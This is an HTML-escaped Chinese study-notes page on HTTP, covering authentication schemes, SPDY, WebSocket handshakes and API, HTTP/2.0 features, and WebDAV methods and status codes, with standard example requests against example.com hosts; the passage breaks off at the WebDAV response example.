&lt;h3 id=&#34;何为认证&#34;&gt;&lt;a href=&#34;#何为认证&#34; class=&#34;headerlink&#34; title=&#34;何为认证&#34;&gt;&lt;/a&gt;何为认证&lt;/h3&gt;&lt;p&gt;为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。&lt;/p&gt;
&lt;h4 id=&#34;HTTP-1-1-使用的认证方式&#34;&gt;&lt;a href=&#34;#HTTP-1-1-使用的认证方式&#34; class=&#34;headerlink&#34; title=&#34;HTTP/1.1 使用的认证方式&#34;&gt;&lt;/a&gt;HTTP/1.1 使用的认证方式&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;BASIC&lt;/strong&gt; 认证（基本认证）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DIGEST&lt;/strong&gt; 认证（摘要认证）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SSL&lt;/strong&gt; 客户端认证&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;FormBase&lt;/strong&gt; 认证（基于表单认证）&lt;/li&gt;
&lt;li&gt;Windows 统一认证（Keberos 认证、NTLM 认证）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;BASIC-认证（基本认证）&#34;&gt;&lt;a href=&#34;#BASIC-认证（基本认证）&#34; class=&#34;headerlink&#34; title=&#34;BASIC 认证（基本认证）&#34;&gt;&lt;/a&gt;&lt;strong&gt;BASIC&lt;/strong&gt; 认证（基本认证）&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/922d89ad738f1561e68b4dc757c68789.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，在HTTP这种非加密信道通信就会被截获。&lt;/p&gt;
&lt;h3 id=&#34;DIGEST-认证（摘要认证）&#34;&gt;&lt;a href=&#34;#DIGEST-认证（摘要认证）&#34; class=&#34;headerlink&#34; title=&#34;DIGEST 认证（摘要认证）&#34;&gt;&lt;/a&gt;&lt;strong&gt;DIGEST&lt;/strong&gt; 认证（摘要认证）&lt;/h3&gt;&lt;p&gt;DIGEST 认证同样使用质询 / 响应的方式&lt;/p&gt;
&lt;p&gt;所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d2892338940c78fc33f6406e7091220c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。&lt;/p&gt;
&lt;h3 id=&#34;SSL-客户端认证&#34;&gt;&lt;a href=&#34;#SSL-客户端认证&#34; class=&#34;headerlink&#34; title=&#34;SSL 客户端认证&#34;&gt;&lt;/a&gt;&lt;strong&gt;SSL&lt;/strong&gt; 客户端认证&lt;/h3&gt;&lt;p&gt;SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书认证，服务器可确认访问是否来自已登录的客户端。&lt;/p&gt;
&lt;h4 id=&#34;步骤&#34;&gt;&lt;a href=&#34;#步骤&#34; class=&#34;headerlink&#34; title=&#34;步骤&#34;&gt;&lt;/a&gt;步骤&lt;/h4&gt;&lt;p&gt;步骤 &lt;strong&gt;1&lt;/strong&gt;： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;2&lt;/strong&gt;： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。&lt;/p&gt;
&lt;p&gt;步骤 &lt;strong&gt;3&lt;/strong&gt;： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。&lt;/p&gt;
&lt;h4 id=&#34;SSL-客户端认证采用双因素认证&#34;&gt;&lt;a href=&#34;#SSL-客户端认证采用双因素认证&#34; class=&#34;headerlink&#34; title=&#34;SSL 客户端认证采用双因素认证&#34;&gt;&lt;/a&gt;&lt;strong&gt;SSL&lt;/strong&gt; 客户端认证采用双因素认证&lt;/h4&gt;&lt;p&gt;在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证组合形成一种双因素认证（Two-factor authentication）来使用。换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。&lt;/p&gt;
&lt;h4 id=&#34;SSL-客户端认证必要的费用（证书）&#34;&gt;&lt;a href=&#34;#SSL-客户端认证必要的费用（证书）&#34; class=&#34;headerlink&#34; title=&#34;SSL 客户端认证必要的费用（证书）&#34;&gt;&lt;/a&gt;&lt;strong&gt;SSL&lt;/strong&gt; 客户端认证必要的费用（证书）&lt;/h4&gt;&lt;h3 id=&#34;基于表单认证&#34;&gt;&lt;a href=&#34;#基于表单认证&#34; class=&#34;headerlink&#34; title=&#34;基于表单认证&#34;&gt;&lt;/a&gt;基于表单认证&lt;/h3&gt;&lt;p&gt;客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。&lt;/p&gt;
&lt;h5 id=&#34;认证多半为基于表单认证&#34;&gt;&lt;a href=&#34;#认证多半为基于表单认证&#34; class=&#34;headerlink&#34; title=&#34;认证多半为基于表单认证&#34;&gt;&lt;/a&gt;认证多半为基于表单认证&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;Session&lt;/strong&gt; 管理及 &lt;strong&gt;Cookie&lt;/strong&gt; 应用&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/2e8062821a51e04c45ae2ac8e7aa8fa1.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;基于-HTTP-的功能追加协议&#34;&gt;&lt;a href=&#34;#基于-HTTP-的功能追加协议&#34; class=&#34;headerlink&#34; title=&#34;基于 HTTP 的功能追加协议&#34;&gt;&lt;/a&gt;基于 &lt;strong&gt;HTTP&lt;/strong&gt; 的功能追加协议&lt;/h2&gt;&lt;h4 id=&#34;基于-HTTP-的协议&#34;&gt;&lt;a href=&#34;#基于-HTTP-的协议&#34; class=&#34;headerlink&#34; title=&#34;基于 HTTP 的协议&#34;&gt;&lt;/a&gt;基于 &lt;strong&gt;HTTP&lt;/strong&gt; 的协议&lt;/h4&gt;&lt;h4 id=&#34;消除-HTTP-瓶颈的-SPDY&#34;&gt;&lt;a href=&#34;#消除-HTTP-瓶颈的-SPDY&#34; class=&#34;headerlink&#34; title=&#34;消除 HTTP 瓶颈的 SPDY&#34;&gt;&lt;/a&gt;消除 &lt;strong&gt;HTTP&lt;/strong&gt; 瓶颈的 &lt;strong&gt;SPDY&lt;/strong&gt;&lt;/h4&gt;&lt;h5 id=&#34;HTTP-瓶颈&#34;&gt;&lt;a href=&#34;#HTTP-瓶颈&#34; class=&#34;headerlink&#34; title=&#34;HTTP 瓶颈&#34;&gt;&lt;/a&gt;&lt;strong&gt;HTTP&lt;/strong&gt; 瓶颈&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/a6c1ddf897e03fc581cd5fd4f7990a4c.png&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Ajax解决&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/d26bb569fc6c3b4263f786cd14533727.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Comet&lt;/strong&gt; 解决&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/0bace5d97336e00fd7d4f6932defe557.png&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;消除 &lt;strong&gt;HTTP&lt;/strong&gt; 瓶颈的 &lt;strong&gt;SPDY&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;SPDY-的设计与功能&#34;&gt;&lt;a href=&#34;#SPDY-的设计与功能&#34; class=&#34;headerlink&#34; title=&#34;SPDY 的设计与功能&#34;&gt;&lt;/a&gt;&lt;strong&gt;SPDY&lt;/strong&gt; 的设计与功能&lt;/h4&gt;&lt;p&gt;SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。&lt;/p&gt;
&lt;p&gt;SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/fb54f1e32d646b366d829a2c9a887ad3.png&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;新功能&#34;&gt;&lt;a href=&#34;#新功能&#34; class=&#34;headerlink&#34; title=&#34;新功能&#34;&gt;&lt;/a&gt;新功能&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;多路复用流&lt;/li&gt;
&lt;li&gt;赋予请求优先级&lt;/li&gt;
&lt;li&gt;压缩 &lt;strong&gt;HTTP&lt;/strong&gt; 首部&lt;/li&gt;
&lt;li&gt;推送功能&lt;/li&gt;
&lt;li&gt;服务器提示功能&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;SPDY-大体上消除了-Web-瓶颈&#34;&gt;&lt;a href=&#34;#SPDY-大体上消除了-Web-瓶颈&#34; class=&#34;headerlink&#34; title=&#34;SPDY 大体上消除了 Web 瓶颈&#34;&gt;&lt;/a&gt;&lt;strong&gt;SPDY&lt;/strong&gt; 大体上消除了 &lt;strong&gt;Web&lt;/strong&gt; 瓶颈&lt;/h4&gt;&lt;h3 id=&#34;使用浏览器进行全双工通信的WebSocket&#34;&gt;&lt;a href=&#34;#使用浏览器进行全双工通信的WebSocket&#34; class=&#34;headerlink&#34; title=&#34;使用浏览器进行全双工通信的WebSocket&#34;&gt;&lt;/a&gt;使用浏览器进行全双工通信的&lt;strong&gt;WebSocket&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。&lt;/p&gt;
&lt;p&gt; WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。&lt;/p&gt;
&lt;h4 id=&#34;WebSocket-协议&#34;&gt;&lt;a href=&#34;#WebSocket-协议&#34; class=&#34;headerlink&#34; title=&#34;WebSocket 协议&#34;&gt;&lt;/a&gt;WebSocket 协议&lt;/h4&gt;&lt;p&gt;一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。&lt;/p&gt;
&lt;p&gt;由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。&lt;/p&gt;
&lt;h5 id=&#34;新特点&#34;&gt;&lt;a href=&#34;#新特点&#34; class=&#34;headerlink&#34; title=&#34;新特点&#34;&gt;&lt;/a&gt;新特点&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;推送功能&lt;/li&gt;
&lt;li&gt;减少通信量&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;实现-WebSocket-通信&#34;&gt;&lt;a href=&#34;#实现-WebSocket-通信&#34; class=&#34;headerlink&#34; title=&#34;实现 WebSocket 通信&#34;&gt;&lt;/a&gt;实现 WebSocket 通信&lt;/h4&gt;&lt;p&gt;完成一次握手&lt;/p&gt;
&lt;h5 id=&#34;握手请求&#34;&gt;&lt;a href=&#34;#握手请求&#34; class=&#34;headerlink&#34; title=&#34;握手请求&#34;&gt;&lt;/a&gt;握手请求&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;GET /chat  HTTP/1.1 
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;server.example.com &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;websocket Connection: Upgrade&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-WebSocket-Key&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;dGhlIHNhbXBsZSBub25jZQ== &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Origin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;http://example.com&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-WebSocket-Protocol&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;chat, superchat &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-WebSocket-Version&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;13&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变。&lt;/p&gt;
&lt;p&gt;Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。&lt;/p&gt;
&lt;h5 id=&#34;握手响应&#34;&gt;&lt;a href=&#34;#握手响应&#34; class=&#34;headerlink&#34; title=&#34;握手响应&#34;&gt;&lt;/a&gt;握手响应&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;&lt;span class=&#34;token response-status&#34;&gt;&lt;span class=&#34;token http-version property&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;token status-code number&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;token reason-phrase string&#34;&gt;Switching Protocols&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Upgrade&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;websocket &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;Upgrade&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-WebSocket-Accept&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;s3pPLMBiTxaQ9kYGzzhZRbK+xOo= &lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Sec-WebSocket-Protocol&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;chat&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/1c6be636e6391922df500391f6f0a9d2.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;WebSocket-API&#34;&gt;&lt;a href=&#34;#WebSocket-API&#34; class=&#34;headerlink&#34; title=&#34;WebSocket API&#34;&gt;&lt;/a&gt;WebSocket API&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-javascript&#34; data-language=&#34;javascript&#34;&gt;&lt;code class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; socket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;WebSocket&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&#39;ws&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;game&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;example&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;12010&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function-variable function&#34;&gt;onopen&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;setInterval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;bufferedAmount &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getUpdateData&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;HTTP-2-0&#34;&gt;&lt;a href=&#34;#HTTP-2-0&#34; class=&#34;headerlink&#34; title=&#34;HTTP/2.0&#34;&gt;&lt;/a&gt;HTTP/2.0&lt;/h3&gt;&lt;h4 id=&#34;HTTP-2-0特点&#34;&gt;&lt;a href=&#34;#HTTP-2-0特点&#34; class=&#34;headerlink&#34; title=&#34;HTTP/2.0特点&#34;&gt;&lt;/a&gt;HTTP/2.0特点&lt;/h4&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;压缩&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;SPDY&lt;/strong&gt;、&lt;strong&gt;Friendly&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;多路复用&lt;/td&gt;
&lt;td&gt;SPDY&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TLS 义务化&lt;/td&gt;
&lt;td&gt;Speed＋ Mobility&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;协商&lt;/td&gt;
&lt;td&gt;Speed＋ Mobility，Friendly&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;客户端拉曳（Client Pull）/服务器推送  （Server Push）&lt;/td&gt;
&lt;td&gt;Speed＋ Mobility&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;流量控制&lt;/td&gt;
&lt;td&gt;SPDY&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;WebSocket&lt;/td&gt;
&lt;td&gt;Speed＋ Mobility&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTP Upgrade 简写为 Friendly。&lt;/p&gt;
&lt;h3 id=&#34;Web-服务器管理文件的-WebDAV&#34;&gt;&lt;a href=&#34;#Web-服务器管理文件的-WebDAV&#34; class=&#34;headerlink&#34; title=&#34;Web 服务器管理文件的 WebDAV&#34;&gt;&lt;/a&gt;&lt;strong&gt;Web&lt;/strong&gt; 服务器管理文件的 &lt;strong&gt;WebDAV&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。&lt;/p&gt;
&lt;p&gt;除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。&lt;/p&gt;
&lt;h4 id=&#34;扩展-HTTP-1-1-的-WebDAV&#34;&gt;&lt;a href=&#34;#扩展-HTTP-1-1-的-WebDAV&#34; class=&#34;headerlink&#34; title=&#34;扩展 HTTP/1.1 的 WebDAV&#34;&gt;&lt;/a&gt;扩展 &lt;strong&gt;HTTP/1.1&lt;/strong&gt; 的 &lt;strong&gt;WebDAV&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/0576a601ec5602848bee1800f36f65f3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;集合（&lt;strong&gt;Collection&lt;/strong&gt;）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。&lt;/p&gt;
&lt;p&gt;资源（&lt;strong&gt;Resource&lt;/strong&gt;）：把文件或集合称为资源。&lt;/p&gt;
&lt;p&gt;属性（&lt;strong&gt;Property&lt;/strong&gt;）：定义资源的属性。定义以&lt;strong&gt;“&lt;/strong&gt;名称 &lt;strong&gt;=&lt;/strong&gt; 值&lt;strong&gt;”&lt;/strong&gt;的格式执行。&lt;/p&gt;
&lt;p&gt;锁（&lt;strong&gt;Lock&lt;/strong&gt;）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。&lt;/p&gt;
&lt;h4 id=&#34;WebDAV-内新增的方法及状态码&#34;&gt;&lt;a href=&#34;#WebDAV-内新增的方法及状态码&#34; class=&#34;headerlink&#34; title=&#34;WebDAV 内新增的方法及状态码&#34;&gt;&lt;/a&gt;&lt;strong&gt;WebDAV&lt;/strong&gt; 内新增的方法及状态码&lt;/h4&gt;&lt;p&gt;WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PROPFIND&lt;/strong&gt; ：获取属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;PROPPATCH&lt;/strong&gt; ：修改属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MKCOL&lt;/strong&gt; ：创建集合&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;COPY&lt;/strong&gt; ：复制资源及属性&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MOVE&lt;/strong&gt; ：移动资源&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;LOCK&lt;/strong&gt; ：资源加锁&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;UNLOCK&lt;/strong&gt; ：资源解锁&lt;/p&gt;
&lt;p&gt;为配合扩展的方法，状态码也随之扩展。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;102 Processing&lt;/strong&gt; ：可正常处理请求，但目前是处理中状态&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;207 Multi-Status&lt;/strong&gt; ：存在多种状态&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;422 Unprocessible Entity&lt;/strong&gt; ：格式正确，内容有误&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;423 Locked&lt;/strong&gt; ：资源已被加锁&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;424 Failed Dependency&lt;/strong&gt; ：处理与某请求关联的请求失败，因此不再维持依赖关系&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;507 Isufficient Storage&lt;/strong&gt; ：保存空间不足&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;WebDAV&lt;/strong&gt; 的请求实例&lt;/p&gt;
&lt;p&gt;下面是使用 PROPFIND 方法对 &lt;a href=&#34;http://www.example.com/file&#34;&gt;http://www.example.com/file &lt;/a&gt;发起获取属性的请求。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-http&#34; data-language=&#34;http&#34;&gt;&lt;code class=&#34;language-http&#34;&gt;PROPFIND /file HTTP/1.1
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;www.example.com&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token header&#34;&gt;&lt;span class=&#34;token header-name keyword&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token header-value&#34;&gt;application/xml; charset=&#34;utf-8&#34; Content-Length: 219&lt;/span&gt;&lt;/span&gt;

&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34; ?&amp;gt;
&amp;lt;D:propfind xmlns:D=&#34;DAV:&#34;&amp;gt;
&amp;lt;D:prop xmlns:R=&#34;http://ns.example.com/boxschema/&#34;&amp;gt;
&amp;lt;R:bigbox/&amp;gt;
&amp;lt;R:author/&amp;gt;
&amp;lt;R:DingALing/&amp;gt;
&amp;lt;R:Random/&amp;gt;
&amp;lt;/D:prop&amp;gt;
&amp;lt;/D:propfind&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;WebDAV&lt;/strong&gt; 的响应实例&lt;/p&gt;
